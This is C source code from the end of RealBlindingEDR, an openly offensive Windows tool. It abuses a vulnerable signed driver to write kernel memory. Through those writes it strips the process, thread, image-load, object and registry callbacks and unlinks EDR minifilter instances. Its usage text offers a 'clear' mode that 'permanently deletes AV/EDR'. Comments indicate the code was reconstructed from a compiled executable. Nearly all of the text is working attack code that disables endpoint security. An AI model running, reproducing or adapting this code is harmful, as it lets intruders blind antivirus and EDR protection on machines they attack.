				if (IsEDRIntance(j, CurLocate)) {
					INT64 tmpNextFlink = 0;
					DriverWriteMemery((VOID*)CurLocate, &tmpNextFlink, 8);
					DriverWriteMemery(&tmpNextFlink, (VOID*)FlinkAddr, 8);
					DriverWriteMemery(&tmpNextFlink, (VOID*)(FlinkAddr + 8), 8);
				}
				else {
					FlinkAddr = CurLocate;
				}
				CurLocate = NextFlink;
				k++;
			} while (k < count);


		}
		
		INT64 tmpaddr = 0;
		DriverWriteMemery((VOID*)(FLT_VOLUMESAddr + 0x10), &tmpaddr, 8);
		FLT_VOLUMESAddr = tmpaddr;
		i++;

	} while (i < FLT_VOLUMESCount);

}

VOID GenerateRandomName() {
	srand((UINT)time(NULL));

	INT length = rand() % 4 + 7;
	TCHAR charset[] = L"abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
	RandomName = (TCHAR*)calloc(length*2 + 12,1);
	if (RandomName) {
		for (INT i = 0; i < length; ++i) {
			INT index = rand() % (INT)(lstrlen(charset) - 1);
			RandomName[i] = charset[index];
		}
	}
	else {
		printf("Random Error!\n");
		ExitProcess(0);
	}
}
int main(int argc, char* argv[])
{
	printf(" _______               __  ______  __   _               __  _               ________ ______  _______     \n");
	printf("|_   __ \\             [  ||_   _ \\[  | (_)             |  ](_)             |_   __  |_   _ `|_   __ \\    \n");
	printf("  | |__) | .---. ,--.  | |  | |_) || | __  _ .--.  .--.| | __  _ .--.  .--./)| |_ \\_| | | `. \\| |__) |   \n");
	printf("  |  __ / / /__\\`'_\\ : | |  |  __'.| |[  |[ `.-. / /'`\\' |[  |[ `.-. |/ /'`\\;|  _| _  | |  | ||  __ /    \n");
	printf(" _| |  \\ \\| \\__.// | |,| | _| |__) | | | | | | | | \\__/  | | | | | | |\\ \\._/_| |__/ |_| |_.' _| |  \\ \\_  \n");
	printf("|____| |___'.__.\\'-;__[___|_______[___[___[___||__'.__.;__[___[___||__.',__|________|______.|____| |___| \n");
	printf("                                                                     ( ( __)) @github.com/myzxcg:v1.5.2 \n");

	// EXE: reads argv only in valid branch, both branches call GenerateRandomName
	if ((unsigned int)(argc - 3) <= 1) {
		// valid: argc == 3 or argc == 4
		const char* v17 = argv[2];
		DrivePath  = argv[1];
		Driver_Type = atoi(v17);
		const char* v18 = NULL;
		if (argc == 4) v18 = argv[3];
		ClearMode = v18;
		GenerateRandomName();

		HINSTANCE hinst = LoadLibraryA("ntdll.dll");
		if (hinst == NULL) return FALSE;
		NTPROC proc = (NTPROC)GetProcAddress(hinst, "RtlGetNtVersionNumbers");
		proc(&dwMajor, &dwMinorVersion, &dwBuild);
		dwBuild &= 0xffff;

		// Driver type 1 (EchoDrv) only supports Win10+
		// Driver type 4 (GPU-Z) only supports Win7 (6.1)
		// EXE (sub_140002BD0): uses exit(0) not return 0 on incompatible version
		if (Driver_Type == 1 && dwMajor < 10) {
			printf("[ERROR] This driver does not support the %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
			exit(0);
		}
		else if (Driver_Type == 4 && dwMajor >= 10) {
			printf("[ERROR] This driver does not support the %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
			exit(0);
		}
		else {
			printf("Windows version: %d.%d.%d version.\n", dwMajor, dwMinorVersion, dwBuild);
		}

		if (!InitialDriver()) return 0;

		// Clear Process/Thread/Image-load notify callbacks
		INT64 PspCreateProcessNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateProcessNotifyRoutine");
		INT64 PspCreateThreadNotifyRoutineAddress  = GetPspNotifyRoutineArray((CHAR*)"PsSetCreateThreadNotifyRoutine");

		if (PspCreateProcessNotifyRoutineAddress) {
			PrintAndClearCallBack(PspCreateProcessNotifyRoutineAddress, (CHAR*)"PsSetCreateProcessNotifyRoutine");
		}
		else {
			printf("Failed to obtain process callback address.\n");
		}
		if (PspCreateThreadNotifyRoutineAddress) {
			PrintAndClearCallBack(PspCreateThreadNotifyRoutineAddress, (CHAR*)"PsSetCreateThreadNotifyRoutine");
		}
		else {
			printf("Failed to obtain thread callback address.\n");
		}
		// PsSetLoadImageNotifyRoutine: EXE condition: if (Size != 3 || dwBuild < 0x55F0)
		// i.e. only SKIP when Driver_Type==3 AND dwBuild >= 0x55F0
		if (Driver_Type != 3 || dwBuild < 0x55F0) {
			INT64 PspLoadImageNotifyRoutineAddress = GetPspNotifyRoutineArray((CHAR*)"PsSetLoadImageNotifyRoutine");
			if (PspLoadImageNotifyRoutineAddress) {
				PrintAndClearCallBack(PspLoadImageNotifyRoutineAddress, (CHAR*)"PsSetLoadImageNotifyRoutine");
			}
			else {
				printf("Image loading callback address acquisition failed.\n");
			}
		}

		ClearObRegisterCallbacks();
		ClearCmRegisterCallback();
		ClearMiniFilterCallback();

		// If 4th argument is "clear" AND Driver_Type != 2, permanently remove AV/EDR
		// EXE: if (v18 && Size != 2 && !stricmp(v18, "clear"))
		if (ClearMode != NULL && Driver_Type != 2 && stricmp(ClearMode, "clear") == 0) {
			RemoveAVForever();
		}
		else {
			printf("\n----------------------------------------------------\n[INFO] No option to permanently close AV/EDR, skip execution.\n");
		}

		printf("\n----------------------------------------------------\n");
		UnloadDrive();
		//system("pause");
	}
	else {
		// EXE: in invalid-argc path, still calls GenerateRandomName then prints usage
		GenerateRandomName();
		printf("Usage: RealBlindingEDR.exe [driver_path] [driver_type] [clear]\n");
		printf("Supported driver numbers: 1, 2, 3, 4\n\n");
		printf("eg: RealBlindingEDR.exe c:\\echo_driver.sys 1\n");
		printf("eg: RealBlindingEDR.exe c:\\echo_driver.sys 1 clear   --- (Permanently delete AV/EDR)\n");
	}
	return 0;
}

